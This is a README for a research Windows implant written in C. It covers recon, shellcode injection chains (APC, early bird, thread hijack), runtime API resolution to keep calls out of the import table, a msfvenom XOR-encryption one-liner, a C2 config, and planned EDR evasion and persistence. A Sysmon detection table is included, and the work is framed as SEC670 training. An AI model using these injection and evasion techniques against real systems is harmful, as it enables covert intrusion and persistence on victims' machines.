# Starforge

Modular Windows implant written in C (MSVC x64). Built as part of SANS SEC670 and ongoing research. The goal is a collection of clean, well-documented modules that can drop into existing C2 frameworks or be used standalone. Not a full C2 framework.

> For authorized testing and research only.

---

## Progress

Aligned with the [30-day implant development plan](https://github.com/aaron-kidwell/Star-Forge) (v9).

| Week | Focus | Status |
|------|--------|--------|
| **1** | Recon & target information collection | **Complete** (Days 1–7) |
| **2** | Shellcode, injection, manual API resolve | **Complete** (Days 8–14, 12.5a) |
| **3** | ETW patch, ntdll unhook, direct syscalls, process hiding | **Next** (Day 15) |
| **4** | Privesc, persistence, WinSock2 C2 beacon | Pending |

**Blocked until Week 3:** Day 14.5 (reflective DLL injection), Day 12.5b (true PE process hollowing).

### Completed modules

| Module | File | Highlights |
|--------|------|------------|
| Config | `src/include/config.h` | `IMPLANT_CONFIG` — C2 host/port, sleep, name, XOR key |
| Recon | `src/modules/recon.c` | Processes, users/groups, shares, adapters, ARP, TCP, integrity, privileges, installed apps |
| Injection | `src/modules/injection.c` | Self-inject, remote DLL, APC, early bird APC, thread context hijack; XOR shellcode; `manual_procaddress` + `RESOLVE` |

### Scaffolded (not yet implemented)

| Module | File | Planned (Week 3–4) |
|--------|------|---------------------|
| Evasion | `src/modules/evasion.c` | ETW patch, hook detect, ntdll unhook, direct syscalls, process hide |
| Privesc | `src/modules/privesc.c` | Token impersonation/theft, named pipe impersonation |
| Persist | `src/modules/persist.c` | HKCU Run key, ITaskService COM scheduled task |
| C2 | `src/modules/c2.c` | WinSock2 TCP beacon, shell/recon/sleep commands |

---

## Structure

```
Star-Forge/
├── src/
│   ├── include/
│   │   └── config.h          — IMPLANT_CONFIG struct
│   ├── main.c                — entry point
│   └── modules/
│       ├── recon.c/h         — target enumeration          [done]
│       ├── injection.c/h     — injection primitives        [done]
│       ├── evasion.c/h       — userland evasion            [stub]
│       ├── privesc.c/h       — privilege escalation        [stub]
│       ├── persist.c/h       — persistence                 [stub]
│       └── c2.c/h            — C2 beacon                   [stub]
├── Star Forge.vcxproj
└── Star Forge.slnx
```

Sensitive APIs are resolved at runtime (`manual_procaddress` / `RESOLVE`). They are not expected in the IAT of Release builds for the injection and recon call paths.

---

## Config

```c
typedef struct _IMPLANT_CONFIG {
    char          c2ip[64];
    int           port;
    int           sleep_interval;
    char          implant_name[64];
    unsigned char xor_key;
} IMPLANT_CONFIG;

IMPLANT_CONFIG config = { "192.168.1.1", 4444, 60, "BASTILA", 0x42 };
```

---

## Recon

Single entry point; no helper processes (`net.exe`, `tasklist`, etc.).

```c
collect_recon();
```

| What | How | DLL |
|------|-----|-----|
| Processes | `WTSEnumerateProcessesW` | wtsapi32.dll |
| Users | `NetUserEnum` | netapi32.dll |
| Groups + members | `NetLocalGroupEnum`, `NetLocalGroupGetMembers` | netapi32.dll |
| Shares | `NetShareEnum` | netapi32.dll |
| Network adapters | `GetAdaptersInfo` | iphlpapi.dll |
| ARP cache | `GetIpNetTable` | iphlpapi.dll |
| TCP connections | `GetTcpTable2` | iphlpapi.dll |
| Integrity level | `GetTokenInformation(TokenIntegrityLevel)` | Advapi32.dll |
| Privileges | `GetTokenInformation(TokenPrivileges)` + `LookupPrivilegeNameW` | Advapi32.dll |
| Installed apps | `RegEnumKeyExW` / `RegQueryValueExW` on HKLM 64/32 + HKCU Uninstall | Advapi32.dll |

---

## Injection

Shellcode is XOR-encrypted at rest with `config.xor_key`. Decrypt in memory immediately before execution. Allocations use **RW → write → RX** (no RWX).

Encrypt at build time:

```bash
msfvenom -p <payload> -f raw | python3 -c "
import sys; key=0x42; data=sys.stdin.buffer.read()
enc=bytes([b^key for b in data])
print('unsigned char buf[]={'+','.join(f'0x{b:02x}' for b in enc)+'}')
"
```

### `inject_self`
Shellcode in own process.

```
VirtualAlloc(RW) → XOR decrypt → memcpy → VirtualProtect(RX) → CreateThread → WaitForSingleObject
```

### `remote_inject`
Classic remote DLL injection. Prompts for PID and DLL path.

```
OpenProcess → VirtualAllocEx → WriteProcessMemory(dllPath) → CreateRemoteThread(LoadLibraryW)
```

### `apc_inject`
Queue shellcode APC to every thread of a target PID. No new remote thread.

```
OpenProcess → VirtualAllocEx → WriteProcessMemory → VirtualProtectEx(RX) →
Toolhelp32 thread snapshot → OpenThread(THREAD_SET_CONTEXT) → QueueUserAPC
```

### `early_apc_inject`
Early bird: shellcode runs before target `main()`. Suspended main thread is alertable; no thread guessing.

```
CreateProcess(CREATE_SUSPENDED) → VirtualAllocEx → WriteProcessMemory →
VirtualProtectEx(RX) → QueueUserAPC(main thread) → ResumeThread
```

Command-line spoofing: image path is the real binary; `lpCommandLine` is the spoofed name shown in Task Manager’s command-line column.

### `thread_hijack` (Day 12.5a)
Spawn suspended host, read PEB image base, redirect `RIP` to shellcode before any user code runs.

```
CreateProcess(CREATE_SUSPENDED) → NtQueryInformationProcess → ReadProcessMemory(PEB+0x10) →
VirtualAllocEx → WriteProcessMemory → VirtualProtectEx(RX) →
GetThreadContext(CONTEXT_FULL) → ctx.Rip = shellcode → SetThreadContext → ResumeThread
```

True PE process hollowing (Day 12.5b) and reflective DLL injection (Day 14.5) are deferred until Week 3 evasion is in place.

---

## PE utils

Manual `GetProcAddress` replacement — walks the PE export directory (and follows forwarded exports).

```c
PVOID manual_procaddress(HMODULE hModule, const char* funcName);
```

`netapi32` and similar forward many exports; the resolver parses the forward string and recurses.

```c
#define RESOLVE(type, name, mod) type name = (type)manual_procaddress(mod, #name)

HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
RESOLVE(pVirtualAllocEx, VirtualAllocEx, k32);
```

Recon and injection use this path instead of `GetProcAddress`.

---

## Detection notes

| Technique | Sysmon / notes |
|-----------|----------------|
| WTS process enum | No `CreateToolhelp32Snapshot` for process list |
| Registry app enum | Read-only; no Sysmon Event 13 |
| Remote DLL injection | Event 8 + Event 10 (remote thread + process access) |
| APC injection | Event 10; often no Event 8 |
| Early bird APC | Event 1 + Event 10 (suspended child, write, resume) |
| Thread context hijack | Event 10; cross-process context set |

---

## Roadmap

- [x] Week 1 — Recon module + config scaffold
- [x] Week 2 — Injection primitives, XOR shellcode, manual resolve, thread hijack
- [ ] Week 3 — ETW patching, ntdll unhooking, direct syscalls, process hiding, Defender matrix
- [ ] Day 14.5 — Reflective DLL injection (after Week 3)
- [ ] Day 12.5b — True PE process hollowing (after Day 14.5)
- [ ] Week 4 — Token privesc, named pipe, registry/COM persistence, WinSock2 C2
- [ ] Day 29 — OPSEC pass: PEB walk, encrypted API strings, sleep jitter, strip symbols

---

## Related research (CVE-POCs)

Weekly PoCs live in [aaron-kidwell/CVE-POCs](https://github.com/aaron-kidwell/CVE-POCs):

| PoC | Status |
|-----|--------|
| CVE-2025-24054 — NTLM hash disclosure via `.url` file | Complete |
| VULN-202375 / SmartScreen COM hijack (MSRC: Kidwell-SmartscreenComHijack-2026-0716) | Submitted (Review/Repro) |
| BlueHammer — Defender VSS abuse | Stretch (Week 3) |
| CVE-2026-20817 — WER ALPC EoP | Reach (Week 4) |

---

Built as part of a structured 30-day implant development plan (SEC670-aligned).
